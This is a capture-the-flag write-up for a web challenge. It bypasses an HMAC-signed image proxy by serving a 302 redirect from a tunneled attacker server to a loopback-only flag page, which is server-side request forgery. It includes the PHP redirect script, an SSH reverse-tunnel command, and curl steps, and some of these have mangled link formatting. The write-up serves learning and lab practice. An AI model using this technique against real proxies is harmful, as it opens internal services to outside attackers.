# WS_1.06 — 302camo

---

## Problem description

The web application allows posting images using `[img]URL[/img]` syntax in blog posts. Upon rendering, the server rewrites the image source to:

```
/camo.php?url=<URL>&hmac=<SIGNATURE>
```

The application uses a server-side secret to sign the `url` parameter. Manually modifying the `url` parameter directly to `http://127.0.0.1/get_flag.php` fails because the signature check fails (`hmac` mismatch).

The internal flag resides at `http://127.0.0.1/get_flag.php`, accessible exclusively via loopback.

---

## Recon

Attempting to manually tamper with the `url` query parameter in `/camo.php` confirms that invalid or missing `hmac` signatures result in an immediate HTTP 403 / Signature verification error.

To observe how signed URLs are generated, we post a valid BBCode image link in a post:

```
[img][https://example.com/test.png](https://example.com/test.png)[/img]
```

Inspecting the rendered post via browser DevTools reveals the valid HMAC-signed source attribute:

```
<img src="/camo.php?url=https%3A%2F%2Fexample.com%2Ftest.png&hmac=f788b73ca42a850a4f26544af514784b">
```

---

## Analysis

To bypass the validation logic without cracking the HMAC secret, we exploit the behavior of the server-side HTTP client following redirects:

1. **Content-Type Validation:** The proxy requires the fetched resource to claim an image MIME type. Including a `Content-Type: image/png` header satisfies this check.
2. **HMAC Signature Bypass via 302 Redirect:** Rather than forging a signature for `http://127.0.0.1/get_flag.php`, we let the server legitimately sign our external domain (e.g., `https://<subdomain>.serveo.net/redirect.php`). When `camo.php` fetches our external endpoint, our server issues an HTTP `302` redirect pointing to `Location: http://127.0.0.1/get_flag.php`.

Because the proxy follows HTTP redirects automatically, it executes a secondary request internally to `http://127.0.0.1/get_flag.php` without re-evaluating or requiring an HMAC for the redirect destination.

---

## Exploit, Step by Step

### 1. Host the Redirect Script

Create a local PHP file (`redirect.php`):

```php
<?php
header('Content-Type: image/png');
header('Location: [http://127.0.0.1/get_flag.php](http://127.0.0.1/get_flag.php)');
exit();
?>
```

Start a local HTTP server:

```bash
php -S 127.0.0.1:5000
```

Expose the local server to the internet via an SSH tunnel (e.g., Serveo or Ngrok):

```bash
ssh -R 80:localhost:5000 serveo.net
```

*(Note: If `serveo.net` experiences downtime or connection limits, `ngrok http 5000` or `localtunnel` can be used as alternatives).*

### 2. Request URL Signing

Submit a new post containing the BBCode link to the tunneled endpoint:

```
[img]https://<your-subdomain>[.serveousercontent.com/redirect.php](https://.serveousercontent.com/redirect.php)[/img]
```

### 3. Fetch the Signed Proxy Link

Inspect the post HTML or intercept the response to extract the full `camo.php` source URL containing the generated `hmac`. Execute a request to the proxy:

```bash
curl -v '[http://302camo.challs.cyberchallenge.it/camo.php?url=https%3A%2F%2F](http://302camo.challs.cyberchallenge.it/camo.php?url=https%3A%2F%2F)<your-subdomain>.serveousercontent.com%2Fredirect.php&hmac=<GENERATED_HMAC>'
```

The proxy fetches the tunneled endpoint, follows the `302` redirect to `127.0.0.1`, and returns the flag output in the response body.

---

## Exploitation with Insomnia

1. **Create Post:** Send a `POST` request to `/post.php` containing `body=[img]https://<your-tunnel-domain>/redirect.php[/img]`.
2. **Extract Signed URL:** Locate the rendered `<img src="/camo.php?url=...&hmac=...">` in the response body.
3. **Trigger SSRF:** Send a `GET` request to the extracted `/camo.php?...` path. Ensure Insomnia has **Follow Redirects** enabled if requesting directly, or allow the server-side cURL client to handle the redirect chain.
4. The response body displays the contents of `/get_flag.php`.

---

## Flag

```
CCIT{****************}
```

---

## What I Learned

* HMAC URL signing guarantees parameter integrity at request creation time, but does not prevent SSRF if the underlying fetcher follows unvalidated HTTP 302 redirects.
* Content-Type checks that rely solely on HTTP response headers without verifying magic bytes can be easily bypassed using `header('Content-Type: image/png')`.
* Public tunneling utilities (`serveo.net`, `ngrok`) enable rapid setup of callback endpoints for SSRF and redirect payloads.